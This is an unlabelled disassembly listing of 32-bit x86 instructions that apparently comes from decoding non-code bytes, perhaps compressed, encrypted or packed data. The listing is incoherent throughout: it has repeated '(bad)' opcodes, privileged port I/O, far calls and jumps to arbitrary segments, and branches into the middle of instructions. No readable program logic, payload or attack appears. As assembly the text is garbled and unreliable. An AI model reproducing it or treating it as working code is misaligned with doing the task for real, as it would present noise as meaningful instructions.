  40cf78:	sub    esi,ebp
  40cf7a:	xchg   ecx,eax
  40cf7b:	cs out 0xfa,al
  40cf7e:	pop    ecx
  40cf7f:	mov    eax,ds:0x7fe0439b
  40cf84:	in     al,dx
  40cf85:	and    esp,edi
  40cf87:	sbb    eax,0x46f3616
  40cf8c:	mov    esi,0x365892ea
  40cf91:	inc    cx
  40cf93:	repnz ficomp WORD PTR [edi-0x5d24f027]
  40cf9a:	inc    ebx
  40cf9b:	sbb    DWORD PTR [esi-0x19],ebx
  40cf9e:	sub    esp,DWORD PTR [ebp+0x2a]
  40cfa1:	pop    edi
  40cfa2:	les    ebx,FWORD PTR [ecx]
  40cfa4:	shl    BYTE PTR [ebp-0x64],1
  40cfa7:	cdq    
  40cfa8:	pop    esi
  40cfa9:	jnp    0x40cff3
  40cfab:	loopne 0x40cfce
  40cfad:	aad    0x5c
  40cfaf:	xor    al,0xae
  40cfb1:	mov    ecx,0xc00f09ee
  40cfb6:	or     eax,0x91798260
  40cfbb:	lahf   
  40cfbc:	ins    DWORD PTR es:[edi],dx
  40cfbd:	stos   DWORD PTR es:[edi],eax
  40cfbe:	call   0x4590:0xc3821be6
  40cfc5:	dec    eax
  40cfc6:	repz ficomp WORD PTR [esi-0x5a]
  40cfca:	ficomp WORD PTR [edi-0x2948c8ce]
  40cfd0:	inc    edx
  40cfd1:	inc    ebx
  40cfd2:	scas   al,BYTE PTR es:[edi]
  40cfd3:	and    eax,0x987a6075
  40cfd8:	xchg   ebp,eax
  40cfd9:	add    BYTE PTR [edx-0x6f],dh
  40cfdc:	pop    esi
  40cfdd:	cwde   
  40cfde:	ss repz daa 
  40cfe1:	xor    BYTE PTR [ecx+0x406103c7],0xc7
  40cfe8:	cwde   
  40cfe9:	jne    0x40cfcd
  40cfeb:	imul   ebp,DWORD PTR [edi],0xf43eb291
  40cff1:	pusha  
  40cff2:	ror    DWORD PTR [eax-0x1edc74c1],cl
  40cff8:	(bad)  [eax-0xb]
  40cffb:	loop   0x40d03d
  40cffd:	out    0x9,al
  40cfff:	in     eax,dx
  40d000:	test   BYTE PTR [esi+ebp*8-0x5c],dl
  40d004:	iret   
  40d005:	lods   eax,DWORD PTR ds:[esi]
  40d006:	cdq    
  40d007:	test   BYTE PTR [eax-0x6f5f4eda],dh
  40d00d:	ror    DWORD PTR [ebp-0x123c3561],0x45
  40d014:	xor    BYTE PTR [ecx],0xec
  40d017:	outs   dx,BYTE PTR ds:[esi]
  40d018:	dec    ecx
  40d019:	cdq    
  40d01a:	retf   
  40d01b:	mov    ah,0xb6
  40d01d:	fistp  QWORD PTR ds:0x5bdc1cff
  40d023:	sub    DWORD PTR [edx+0x63],ebp
  40d026:	jmp    0x40cfc8
  40d028:	sub    al,0x5b
  40d02a:	stos   BYTE PTR es:[edi],al
  40d02b:	pop    ds
  40d02c:	jle    0x40d028
  40d02e:	scas   eax,DWORD PTR es:[edi]
  40d02f:	cmc    
  40d030:	pop    esi
  40d031:	mov    ch,0x14
  40d033:	sbb    DWORD PTR [esp+ebp*4-0x29],eax
  40d037:	sbb    al,0xbe
  40d039:	pusha  
  40d03a:	jl     0x40d07b
  40d03c:	fldz   
  40d03e:	push   ebx
  40d03f:	mov    WORD PTR [ebp-0x22034204],?
  40d045:	mov    al,ds:0x935efc16
  40d04a:	xor    ch,BYTE PTR [ebp+eax*1-0x6a]
  40d04e:	cmp    ah,BYTE PTR [edi-0x2f]
  40d051:	mov    fs:0x3871deac,eax
  40d057:	inc    eax
  40d058:	inc    edx
  40d059:	sub    eax,ebp
  40d05b:	sbb    eax,0x860bc860
  40d060:	stc    
  40d061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d062:	dec    esp
  40d063:	arpl   WORD PTR [ebx],dx
  40d065:	and    ebx,ecx
  40d067:	pusha  
  40d068:	pop    eax
  40d069:	lods   eax,DWORD PTR ds:[esi]
  40d06a:	xchg   esi,eax
  40d06b:	mov    eax,ds:0x9b6163d9
  40d070:	adc    cl,BYTE PTR [ebx]
  40d072:	sar    DWORD PTR [edx],cl
  40d074:	pop    ecx
  40d075:	push   esi
  40d076:	or     dh,dl
  40d078:	repz jnp 0x40d0e9
  40d07b:	in     eax,dx
  40d07c:	fisubr WORD PTR [eax+0x64]
  40d07f:	mov    ds:0xfe99b8af,al
  40d084:	inc    esp
  40d085:	stos   BYTE PTR es:[edi],al
  40d086:	mov    ebx,0x5b306959
  40d08b:	inc    edx
  40d08c:	bound  edi,QWORD PTR [esp+ebx*8]
  40d08f:	cmp    eax,0x9fd9294b
  40d094:	mov    eax,0xdeb3f815
  40d099:	fcmovbe st,st(6)
  40d09b:	jmp    0xc097:0x35e7479a
  40d0a2:	jo     0x40d053
  40d0a4:	mov    es,WORD PTR [eax-0x57]
  40d0a7:	sub    ebx,DWORD PTR [ecx+eiz*2]
  40d0aa:	std    
  40d0ab:	mov    edx,0x60cb2967
  40d0b0:	outs   dx,DWORD PTR ds:[esi]
  40d0b1:	mov    bl,0xee
  40d0b3:	aaa    
  40d0b4:	rcl    BYTE PTR [ebx],0xb3
  40d0b7:	xchg   bl,al
  40d0b9:	or     edi,esi
  40d0bb:	lahf   
  40d0bc:	xchg   BYTE PTR [eax+esi*2],ah
  40d0bf:	repz fidivr WORD PTR [eax+eax*2+0x59]
  40d0c4:	and    al,0x33
  40d0c6:	out    dx,al
  40d0c7:	mov    ds:0x6645780e,eax
  40d0cc:	call   0x72e1c22b
  40d0d1:	xor    DWORD PTR [ecx-0x6d],edx
  40d0d4:	fs ds xchg esi,eax
  40d0d7:	xlat   BYTE PTR ds:[ebx]
  40d0d8:	pop    esi
  40d0d9:	cmp    DWORD PTR [ebx+eiz*2+0x382f9932],ecx
  40d0e0:	mov    esp,0x1d3b6260
  40d0e5:	push   ss
  40d0e6:	popa   
  40d0e7:	clc    
  40d0e8:	xchg   ebx,eax
  40d0e9:	je     0x40d0d9
  40d0eb:	sub    edi,edi
  40d0ed:	sub    ah,BYTE PTR [ebp+ebp*4+0x7e]
  40d0f1:	push   0xdda4a131
  40d0f6:	jl     0x40d12a
  40d0f8:	mov    ebx,0x634c1d6e
  40d0fd:	inc    esi
  40d0fe:	jp     0x40d10f
  40d100:	xor    eax,0x7fd48241
  40d105:	std    
  40d106:	lock jp 0x40d14e
  40d109:	inc    ebx
  40d10a:	adc    ebp,DWORD PTR [eax-0x19]
  40d10d:	adc    DWORD PTR [edi],ebx
  40d10f:	sub    ah,ch
  40d111:	xor    BYTE PTR [esi],cl
  40d113:	ins    DWORD PTR es:[edi],dx
  40d114:	or     bl,bh
  40d116:	lahf   
  40d117:	fld    QWORD PTR [edx+0x79]
  40d11a:	inc    ebp
  40d11b:	xchg   esp,eax
  40d11c:	pop    esi
  40d11d:	jmp    0xa0e9:0x245b92b3
  40d124:	mov    WORD PTR [ecx+0xf],ss
  40d127:	(bad)  
  40d128:	pop    ebp
  40d129:	ss jne 0x40d0be
  40d12c:	pop    esi
  40d12d:	dec    ebx
  40d12e:	adc    esi,DWORD PTR [esi]
  40d130:	cmp    ecx,DWORD PTR [edi]
  40d132:	push   es
  40d133:	inc    edx
  40d134:	test   BYTE PTR [eax-0x1f],ah
  40d137:	ins    BYTE PTR es:[edi],dx
  40d138:	dec    ecx
  40d139:	(bad)  
  40d13a:	xchg   esp,eax
  40d13b:	iret   
  40d13c:	je     0x40d184
  40d13e:	out    dx,eax
  40d13f:	retf   
  40d140:	add    BYTE PTR [ebp-0x22735bc1],dh
  40d146:	in     al,dx
  40d147:	adc    dh,BYTE PTR ds:0x9d92a721
  40d14d:	addr16 je 0x40d147
  40d150:	loopne 0x40d0d9
  40d152:	push   ebx
  40d153:	or     eax,0x786ea268
  40d158:	xchg   ecx,eax
  40d159:	mov    ds:0x6f5ea76a,al
  40d15e:	mov    bl,0x81
  40d160:	mov    eax,ds:0x1a2d5174
  40d165:	popa   
  40d166:	sub    BYTE PTR [ebp-0x26975f3d],al
  40d16c:	sub    eax,0x5c1beb31
  40d171:	call   0xd125b76d
  40d176:	or     eax,0x3429aed6
  40d17b:	mov    eax,ds:0xc6711c7e
  40d180:	sub    ch,BYTE PTR [edx*8-0x5a50ced4]
  40d187:	cmp    eax,0x9ced07ef
  40d18c:	mov    dh,0x99
  40d18e:	dec    ebp
  40d18f:	dec    eax
  40d190:	mov    ds:0x56b08107,al
  40d195:	sub    eax,0x98de2ca4
  40d19a:	gs push edi
  40d19c:	jns    0x40d1a4
  40d19e:	push   ds
  40d19f:	jbe    0x40d1e3
  40d1a1:	mov    bl,0xc9
  40d1a3:	hlt    
  40d1a4:	pop    edi
  40d1a5:	outs   dx,BYTE PTR ds:[esi]
  40d1a6:	jmp    0x40d1a2
  40d1a8:	inc    esp
  40d1a9:	xchg   ecx,eax
  40d1aa:	add    DWORD PTR [ebx],0x1bd75dbf
  40d1b0:	mov    eax,0x9e2a9a92
  40d1b5:	dec    ebp
  40d1b6:	jg     0x40d17a
  40d1b8:	pop    esi
  40d1b9:	ins    DWORD PTR es:[edi],dx
  40d1ba:	jno    0x40d157
  40d1bc:	fild   WORD PTR [edi+ecx*1-0x4a]
  40d1c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1c1:	pusha  
  40d1c2:	dec    edx
  40d1c3:	or     al,0xfc
  40d1c5:	inc    ebp
  40d1c6:	pushw  cs
  40d1c8:	ins    BYTE PTR es:[edi],dx
  40d1c9:	cmp    esi,ebp
  40d1cb:	or     al,0x5c
  40d1cd:	pop    esp
  40d1ce:	jbe    0x40d20f
  40d1d0:	push   edx
  40d1d1:	or     eax,edi
  40d1d3:	mov    al,ds:0x3e3ae2d8
  40d1d8:	push   ebx
  40d1d9:	(bad)  
  40d1da:	ins    BYTE PTR es:[edi],dx
  40d1db:	repz push ebx
  40d1dd:	nop
  40d1de:	sbb    BYTE PTR [ecx],dh
  40d1e0:	fimul  WORD PTR [ebx-0x2c]
  40d1e3:	xchg   BYTE PTR [esi-0x305f41d9],cl
  40d1e9:	fcmovb st,st(3)
  40d1eb:	dec    esi
  40d1ec:	jno    0x40d21e
  40d1ee:	fisttp DWORD PTR [eax+0x5e]
  40d1f1:	(bad)  
  40d1f2:	fwait
  40d1f3:	ret    
  40d1f4:	in     al,dx
  40d1f5:	dec    ecx
  40d1f6:	push   edx
  40d1f7:	aam    0xb5
  40d1f9:	pusha  
  40d1fa:	in     eax,dx
  40d1fb:	add    DWORD PTR [ecx+0x2904c7a2],eax
  40d201:	jne    0x40d1f1
  40d203:	adc    al,0x4d
  40d205:	scas   eax,DWORD PTR es:[edi]
  40d206:	jne    0x40d273
  40d208:	xchg   ecx,eax
  40d209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d20a:	cwde   
  40d20b:	mov    eax,ds:0x58a262ea
  40d210:	push   edx
  40d211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d212:	and    esi,DWORD PTR [ebx+0x1540dc5f]
  40d218:	imul   ecx,DWORD PTR [ecx],0x5b1e0fcc
  40d21e:	mov    cl,0x11
  40d220:	(bad)  
  40d221:	pusha  
  40d222:	pushf  
  40d223:	xor    edi,ebp
  40d225:	jo     0xef2e09c5
  40d22b:	xchg   edx,eax
  40d22c:	dec    ebx
  40d22d:	aad    0x1b
  40d22f:	sar    DWORD PTR [ebp-0x155f00fa],cl
  40d235:	sbb    al,0xc6
  40d237:	cmp    ecx,DWORD PTR [ebx]
  40d239:	xchg   ebp,eax
  40d23a:	icebp  
  40d23b:	aaa    
  40d23c:	aaa    
  40d23d:	out    0x3d,eax
  40d23f:	adc    cl,dh
  40d241:	or     ebp,DWORD PTR [esi-0x77]
  40d244:	iret   
  40d245:	hlt    
  40d246:	cld    
  40d247:	jbe    0x40d296
  40d249:	popa   
  40d24a:	dec    esi
  40d24b:	outs   dx,BYTE PTR ds:[esi]
  40d24c:	sbb    eax,0x9fc2d1bc
  40d251:	inc    edx
  40d252:	out    dx,al
  40d253:	cmp    bl,BYTE PTR [edi]
  40d255:	and    dl,dh
  40d257:	(bad)  
  40d258:	out    dx,eax
  40d259:	adc    BYTE PTR [edx],bh
  40d25b:	lock std 
  40d25d:	inc    ecx
  40d25e:	mov    eax,0x149e2f35
  40d263:	dec    esp
  40d264:	sbb    BYTE PTR [eax-0x5817486a],bl
  40d26a:	out    dx,al
  40d26b:	push   eax
  40d26c:	(bad)  
  40d26d:	lods   eax,DWORD PTR ds:[esi]
  40d26e:	sub    DWORD PTR [edx],0xa18f500e
  40d274:	(bad)  
  40d275:	mov    edx,0xe4cb84c4
  40d27a:	xchg   esp,eax
  40d27b:	push   es
  40d27c:	pop    esi
  40d27d:	outs   dx,BYTE PTR ds:[esi]
  40d27e:	push   edi
  40d27f:	hlt    
  40d280:	mov    cl,0xee
  40d282:	cdq    
  40d283:	data16 fisub DWORD PTR [eax+0x39]
  40d287:	cdq    
  40d288:	clc    
  40d289:	nop
  40d28a:	sahf   
  40d28b:	sti    
  40d28c:	add    al,0x7b
  40d28e:	out    dx,al
  40d28f:	and    bh,bl
  40d291:	into   
  40d292:	scas   eax,DWORD PTR es:[edi]
  40d293:	sub    ecx,DWORD PTR [edx]
  40d295:	lds    ebx,FWORD PTR [ebx-0x5f]
  40d298:	leave  
  40d299:	push   edi
  40d29a:	mov    bl,BYTE PTR [esi+0x2f]
  40d29d:	sub    eax,0x1e5e4918
  40d2a2:	cdq    
  40d2a3:	xchg   ebx,eax
  40d2a4:	xchg   esp,eax
  40d2a5:	fisttp DWORD PTR [edx]
  40d2a7:	pusha  
  40d2a8:	push   ds
  40d2a9:	sar    DWORD PTR [ecx],0xa4
  40d2ac:	nop
  40d2ad:	jg     0x40d245
  40d2af:	retf   0x1a5d
  40d2b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2b3:	pop    edx
  40d2b4:	loopne 0x40d286
  40d2b6:	out    dx,al
  40d2b7:	scas   al,BYTE PTR es:[edi]
  40d2b8:	cmp    eax,DWORD PTR [eax+0x0]
  40d2bb:	fist   WORD PTR [esi-0x53]
  40d2be:	pop    esp
  40d2bf:	pushf  
  40d2c0:	add    ebx,DWORD PTR fs:[edx+ecx*8-0x69f4baa2]
  40d2c8:	dec    eax
  40d2c9:	les    eax,FWORD PTR [edx]
  40d2cb:	fs test ebx,ebx
  40d2ce:	scas   al,BYTE PTR es:[edi]
  40d2cf:	mov    bl,bh
  40d2d1:	lods   al,BYTE PTR ds:[esi]
  40d2d2:	jl     0x40d279
  40d2d4:	mov    fs,WORD PTR [eax-0x78]
  40d2d7:	adc    BYTE PTR [eax+0x6e21eb27],dl
  40d2dd:	out    dx,eax
  40d2de:	out    dx,al
  40d2df:	or     DWORD PTR [eax+0x3a],edi
  40d2e2:	bound  ebp,QWORD PTR [ecx]
  40d2e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2e5:	and    dl,al
  40d2e7:	scas   al,BYTE PTR es:[edi]
  40d2e8:	adc    BYTE PTR [edi-0x3f1a88c2],dh
  40d2ee:	adc    DWORD PTR [ecx+0x42a3a074],esp
  40d2f4:	cmp    ebp,edx
  40d2f6:	add    eax,0xebcd7aee
  40d2fb:	push   ebx
  40d2fc:	add    al,0xdd
  40d2fe:	sub    BYTE PTR [eax-0x37],0xa8
  40d302:	pop    esi
  40d303:	add    eax,0x4fec08bc
  40d308:	pop    esi
  40d309:	sub    DWORD PTR [ebp+0x31],edi
  40d30c:	pop    edi
  40d30d:	pop    ds
  40d30e:	aaa    
  40d30f:	xlat   BYTE PTR ds:[ebx]
  40d310:	pop    esi
  40d311:	ret    0x6da8
  40d314:	sbb    DWORD PTR [eax+0x59b8f9d1],ebx
  40d31a:	xor    dh,BYTE PTR [edi-0x2b]
  40d31d:	xlat   BYTE PTR ds:[ebx]
  40d31e:	pop    esp
  40d31f:	push   ecx
  40d320:	pop    eax
  40d321:	loope  0x40d392
  40d323:	sbb    BYTE PTR [ebp-0x69],0xf9
  40d327:	push   cs
  40d328:	adc    esi,0xffffffa1
  40d32b:	and    eax,0x93f29ea6
  40d330:	icebp  
  40d331:	pop    es
  40d332:	addr16 aas 
  40d334:	fs sbb eax,0x439eafc6
  40d33a:	repz loop 0x40d32f
  40d33d:	mov    BYTE PTR [esi],0xa1
  40d340:	sti    
  40d341:	(bad)  
  40d343:	pop    esi
  40d344:	popf   
  40d345:	mov    al,0x5a
  40d347:	pop    esi
  40d348:	inc    esp
  40d349:	push   edx
  40d34a:	idiv   BYTE PTR [edx]
  40d34c:	pop    esi
  40d34d:	or     BYTE PTR [eax+0x2a0e9009],dh
  40d353:	out    dx,al
  40d354:	loop   0x40d39a
  40d356:	out    0x28,eax
  40d358:	and    DWORD PTR [ecx-0x79],esp
  40d35b:	mov    ah,0x91
  40d35d:	push   0x1a5ecc6f
  40d362:	lds    ebp,FWORD PTR [edx]
  40d364:	shr    BYTE PTR ds:0x2a696c43,1
  40d36a:	les    esp,FWORD PTR [eax-0x134bbb08]
  40d370:	out    0xa8,eax
  40d372:	test   eax,0xf0d44fc8
  40d377:	test   al,0x5e
  40d379:	push   edx
  40d37a:	mov    dl,0x4c
  40d37c:	sahf   
  40d37d:	addr16 retf 
  40d37f:	mov    al,ds:0xa1f795b4
  40d384:	add    bh,0x98
  40d387:	ret    
  40d388:	pop    esi
  40d389:	jo     0x40d3ad
  40d38b:	xchg   esi,eax
  40d38c:	xchg   esp,eax
  40d38d:	pop    esi
  40d38e:	shl    BYTE PTR [edi+ebx*2-0x270b86a4],1
  40d395:	adc    ecx,DWORD PTR [ecx-0x72cc7fdf]
  40d39b:	or     BYTE PTR [ebx+edx*1-0x41],ah
  40d39f:	(bad)  [esi+0x54c87f40]
  40d3a5:	mov    cl,0x61
  40d3a7:	mov    ds:0xe521f26b,al
  40d3ac:	cmp    eax,0x5064d01e
  40d3b1:	mov    eax,0x8ad931ea
  40d3b6:	add    BYTE PTR [esi-0x22],0x11
  40d3ba:	dec    ecx
  40d3bb:	stc    
  40d3bc:	ss push ebx
  40d3be:	jns    0x40d434
  40d3c0:	loop   0x40d407
  40d3c2:	mov    ds,WORD PTR [ebp-0xd]
  40d3c5:	xor    edi,DWORD PTR [esi-0x73]
  40d3c8:	not    DWORD PTR [ecx]
  40d3ca:	(bad)  
  40d3cb:	xlat   BYTE PTR ds:[ebx]
  40d3cc:	pusha  
  40d3cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3ce:	or     bh,ch
  40d3d0:	and    eax,0x6780f9fe
  40d3d5:	jne    0x40d405
  40d3d7:	or     edx,edi
  40d3d9:	pusha  
  40d3da:	mov    ebx,0xe8e096a
  40d3df:	fwait
  40d3e0:	sbb    BYTE PTR [ebx],bl
  40d3e2:	in     al,dx
  40d3e3:	pop    ds
  40d3e4:	push   ebx
  40d3e5:	jmp    0x4711:0xa0ac2455
  40d3ec:	punpcklwd mm3,DWORD PTR [ebx-0x5a]
  40d3f0:	or     BYTE PTR [ebx+0x1a14c9f4],cl
  40d3f6:	(bad)  
  40d3f8:	pop    edi
  40d3f9:	sbb    BYTE PTR [eax-0x171e3b06],bl
  40d3ff:	jo     0x40d3c4
  40d401:	dec    edx
  40d402:	in     eax,dx
  40d403:	mov    al,ds:0x63075394
  40d408:	int    0x8
  40d40a:	(bad)  
  40d40b:	out    0x5e,eax
  40d40d:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40d40f:	xchg   DWORD PTR [ecx],ecx
  40d411:	pop    si
  40d413:	data16 sub al,0x60
  40d416:	repz or cl,BYTE PTR [edi-0x6c83d55f]
  40d41d:	rcl    BYTE PTR [eax-0x75c9bdd],0xd5
  40d424:	loop   0x40d465
  40d426:	mov    BYTE PTR [edx+0x481e28d6],bl
  40d42c:	cmc    
  40d42d:	pusha  
  40d42e:	jae    0x40d45d
  40d430:	test   BYTE PTR [edi-0x7f8f7a37],cl
  40d436:	out    dx,al
  40d437:	push   cs
  40d438:	fld    QWORD PTR [ecx+0x1]
  40d43b:	outs   dx,BYTE PTR ds:[esi]
  40d43c:	sub    eax,0x45aec89a
  40d441:	mov    DWORD PTR [ebx-0x11cddd19],esp
  40d447:	outs   dx,DWORD PTR ds:[esi]
  40d448:	enter  0x7ce2,0x9f
  40d44c:	xlat   BYTE PTR ds:[ebx]
  40d44d:	(bad)  
  40d44e:	out    dx,al
  40d44f:	mov    DWORD PTR [edx+0x93606c],edi
  40d455:	and    cl,0xa0
  40d458:	push   0xffffffd3
  40d45a:	stos   BYTE PTR es:[edi],al
  40d45b:	xor    al,0x4
  40d45d:	cmp    BYTE PTR [edi+0x61665ed7],al
  40d463:	scas   al,BYTE PTR es:[edi]
  40d464:	mov    cl,0xbf
  40d466:	ss pop eax
  40d468:	inc    edx
  40d469:	pop    edx
  40d46a:	inc    edi
  40d46b:	mov    al,0x67
  40d46d:	retf   
  40d46e:	jmp    DWORD PTR [eax]
  40d470:	ret    0xbfa7
  40d473:	sub    al,0x5e
  40d475:	sbb    esp,edi
  40d477:	xchg   esi,eax
  40d478:	popw   ss
  40d47a:	fnstcw WORD PTR [edx-0x69eca13f]
  40d480:	rcl    bh,cl
  40d482:	jle    0x40d49c
  40d484:	sahf   
  40d485:	aad    0x4e
  40d487:	fsub   QWORD PTR [ebx-0x26]
  40d48a:	cwde   
  40d48b:	mov    edi,0xd5f0a340
  40d490:	sbb    eax,0xf56bcd01
  40d495:	dec    esp
  40d496:	jno    0x40d427
  40d498:	mov    ecx,0x844e235a
  40d49d:	and    BYTE PTR [edx],al
  40d49f:	mov    edi,0x50af23c9
  40d4a4:	xor    cl,BYTE PTR [edx]
  40d4a6:	aam    0xa1
  40d4a8:	fiadd  WORD PTR [ecx+0x528cb8ca]
  40d4ae:	pop    edx
  40d4af:	clc    
  40d4b0:	and    DWORD PTR [ebp+0x514fa0ac],esi
  40d4b6:	pusha  
  40d4b7:	xor    al,0xfb
  40d4b9:	mov    ch,0x24
  40d4bb:	dec    ebx
  40d4bc:	pop    esi
  40d4bd:	pushf  
  40d4be:	jbe    0x40d525
  40d4c0:	add    al,0x77
  40d4c2:	test   eax,0xdf60dff6
  40d4c7:	sbb    al,0x3a
  40d4c9:	fs cwde 
  40d4cb:	cmp    al,0xc2
  40d4cd:	retf   0xbc02
  40d4d0:	fnstsw WORD PTR [ebp+0x7c]
  40d4d3:	pop    edi
  40d4d4:	pop    esi
  40d4d5:	sub    ah,dh
  40d4d7:	or     BYTE PTR [ecx+0x18],bl
  40d4da:	es repz push ds
  40d4dd:	jns    0x40d487
  40d4df:	es mov bh,0x59
  40d4e2:	outs   dx,BYTE PTR ds:[esi]
  40d4e3:	mov    ss,WORD PTR [edx+0xe12234]
  40d4e9:	adc    eax,0xd5fe28c
  40d4ee:	cmp    DWORD PTR [eax+0x1f],esp
  40d4f1:	mov    al,ds:0xa1d2412c
  40d4f6:	jnp    0x40d488
  40d4f8:	leave  
  40d4f9:	popa   
  40d4fa:	sub    ah,dl
  40d4fc:	fbstp  TBYTE PTR [edx+0x4e]
  40d4ff:	push   0xc6953147
  40d504:	pop    edi
  40d505:	and    al,0xa9
  40d507:	push   cs
  40d508:	xor    DWORD PTR [edx+0x97550e3],esi
  40d50e:	and    BYTE PTR [esi+0x676e4d41],ch
  40d514:	mov    ?,WORD PTR [esi-0x30052b65]
  40d51a:	clc    
  40d51b:	mov    ebp,DWORD PTR [edx+0x69]
  40d51e:	call   0xce489653
  40d523:	hlt    
  40d524:	sbb    DWORD PTR [edi+0x14],0x9af7491e
  40d52b:	ficomp WORD PTR [esi*4-0x7a012ad]
  40d532:	(bad)  [ebx-0x60]
  40d535:	adc    BYTE PTR [esi+0x21],dh
  40d538:	or     ebx,DWORD PTR [ebp+0x5a3e1197]
  40d53e:	inc    esi
  40d53f:	xchg   DWORD PTR [ebx],esi
  40d541:	adc    al,0xe
  40d543:	adc    al,0x7b
  40d545:	sbb    DWORD PTR [esi-0x118f8876],edx
  40d54b:	mov    ebp,0x564ee9a6
  40d550:	push   0xcf8e53e1
  40d555:	bound  ebx,QWORD PTR [eax]
  40d557:	fild   WORD PTR [ebp-0x3d]
  40d55a:	cs (bad) 
  40d55c:	sub    cl,BYTE PTR [edx+0x30]
  40d55f:	jbe    0x40d5bc
  40d561:	cmp    DWORD PTR [ebx+0x1f89df3d],ecx
  40d567:	inc    ecx
  40d568:	sti    
  40d569:	ret    
  40d56a:	in     al,dx
  40d56b:	or     ebp,DWORD PTR [esi-0x20dadb9e]
  40d571:	ins    BYTE PTR es:[edi],dx
  40d572:	les    esi,FWORD PTR [esi-0x3]
  40d575:	ficomp DWORD PTR [esi-0x16]
  40d578:	js     0x40d5e7
  40d57a:	out    0xec,eax
  40d57c:	or     bh,BYTE PTR [edi+0xf6eba32]
  40d582:	cmp    al,0xec
  40d584:	imul   esp,DWORD PTR [eax-0x3d],0x2f82d8e5
  40d58b:	sub    DWORD PTR [ebx+0x68],edi
  40d58e:	pop    eax
  40d58f:	and    eax,0x20f81f60
  40d594:	cmp    DWORD PTR [esi-0x58],esp
  40d597:	and    BYTE PTR [ebx+0x2c84ed8b],bl
  40d59d:	data16 lock mov ds:0xd81e275b,al
  40d5a4:	xchg   BYTE PTR [eax],al
  40d5a6:	(bad)  
  40d5a7:	push   ss
  40d5a8:	xor    cl,BYTE PTR [edx-0x12]
  40d5ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5ac:	adc    esp,ecx
  40d5ae:	lds    esp,FWORD PTR [ebx-0x5e647a8a]
  40d5b4:	inc    ecx
  40d5b5:	retf   0x9f0
  40d5b8:	iret   
  40d5b9:	or     BYTE PTR [eax-0x457ea486],ah
  40d5bf:	lea    esi,[edx-0x53729119]
  40d5c5:	mov    esp,0x7600a3aa
  40d5ca:	sbb    DWORD PTR [edx-0x34],ebx
  40d5cd:	cld    
  40d5ce:	inc    esi
  40d5cf:	pop    eax
  40d5d0:	bound  ebp,QWORD PTR [ebp+0x258d4eee]
  40d5d6:	mov    edx,0x4cee4c65
  40d5db:	mov    eax,ds:0xc29cc56f
  40d5e0:	imul   esi,esp,0xffffffe4
  40d5e3:	mov    bl,0x60
  40d5e5:	gs xchg ebp,eax
  40d5e7:	ins    DWORD PTR es:[edi],dx
  40d5e8:	rol    BYTE PTR [ebp+edi*2-0x1d],0x35
  40d5ed:	and    edx,eax
  40d5ef:	(bad)  
  40d5f0:	mov    eax,0x245cbe60
  40d5f5:	fadd   DWORD PTR [ebp+0x5229067e]
  40d5fb:	std    
  40d5fc:	pop    edx
  40d5fd:	ret    
  40d5fe:	mov    es,edx
  40d600:	sub    edx,DWORD PTR [esp+edx*2+0x5480aa28]
  40d607:	ss sub al,0x5a
  40d60a:	mov    ebx,DWORD PTR [ebp+0x5b]
  40d60d:	popf   
  40d60e:	clc    
  40d60f:	fs mov ch,0xec
  40d612:	(bad)  
  40d613:	adc    ebx,DWORD PTR [ebx-0x425eeeca]
  40d619:	ficomp WORD PTR [ebx+ebx*2]
  40d61c:	daa    
  40d61d:	or     ecx,DWORD PTR ss:[esi+0x7796654]
  40d624:	fimul  WORD PTR [esi+esi*4-0x4b]
  40d628:	sbb    ah,ch
  40d62a:	and    BYTE PTR [ecx+0x6804458e],0x6e
  40d631:	dec    ecx
  40d632:	mov    es,WORD PTR [edi-0x665287a2]
  40d638:	dec    esp
  40d639:	lods   al,BYTE PTR ds:[esi]
  40d63a:	jmp    0x40d66c
  40d63c:	repz pop edi
  40d63e:	mul    BYTE PTR [eax]
  40d640:	mov    eax,DWORD PTR [eax+0xd]
  40d643:	popf   
  40d644:	jb     0x40d686
  40d646:	jle    0x40d66f
  40d648:	fs inc edx
  40d64a:	cld    
  40d64b:	adc    al,0xd5
  40d64d:	jns    0x40d67d
  40d64f:	inc    ebx
  40d650:	push   cs
  40d651:	outs   dx,BYTE PTR ds:[esi]
  40d652:	ror    DWORD PTR [edx-0x45bca5db],0x44
  40d659:	lds    edx,FWORD PTR [esi-0x6f]
  40d65c:	icebp  
  40d65d:	frstor [edi-0x22]
  40d660:	pop    esi
  40d661:	mov    edi,0x3d8ec91f
  40d666:	mov    dl,0xe0
  40d668:	sbb    DWORD PTR [ecx+0x5e],esp
  40d66b:	pop    edx
  40d66c:	push   edi
  40d66d:	xchg   DWORD PTR [ebx+0x241b2615],eax
  40d673:	add    edi,0xffffff84
  40d676:	mov    edx,0xaec7038f
  40d67b:	es jg  0x40d68d
  40d67e:	pop    esi
  40d67f:	lods   al,BYTE PTR ds:[esi]
  40d680:	xchg   esp,eax
  40d681:	pop    ebp
  40d682:	ja     0x40d6dd
  40d684:	sbb    DWORD PTR [ebx-0x1f],esp
  40d687:	and    BYTE PTR [ebx-0x525d6aa1],bl
  40d68d:	cdq    
  40d68e:	inc    ebx
  40d68f:	xchg   ecx,eax
  40d690:	mov    ?,WORD PTR [ecx]
  40d692:	stos   BYTE PTR es:[edi],al
  40d693:	pusha  
  40d694:	gs call 0xc26c:0xd17cfddd
  40d69c:	cld    
  40d69d:	cli    
  40d69e:	jmp    0x40d64f
  40d6a0:	xchg   edx,eax
  40d6a1:	dec    ebx
  40d6a2:	jno    0x40d64e
  40d6a4:	mov    eax,ds:0xfed26e30
  40d6a9:	cmp    BYTE PTR [edi-0x21],cl
  40d6ac:	out    0xa9,al
  40d6ae:	out    0xf6,eax
  40d6b0:	xchg   BYTE PTR [ecx-0x48],al
  40d6b3:	sub    edi,DWORD PTR [esi+0x63ae2b96]
  40d6b9:	pop    edx
  40d6ba:	loop   0x40d646
  40d6bc:	into   
  40d6bd:	add    al,0x2a
  40d6bf:	jno    0x40d6bf
  40d6c1:	cli    
  40d6c2:	xchg   edi,eax
  40d6c3:	mov    edi,gs
  40d6c5:	adc    ch,dh
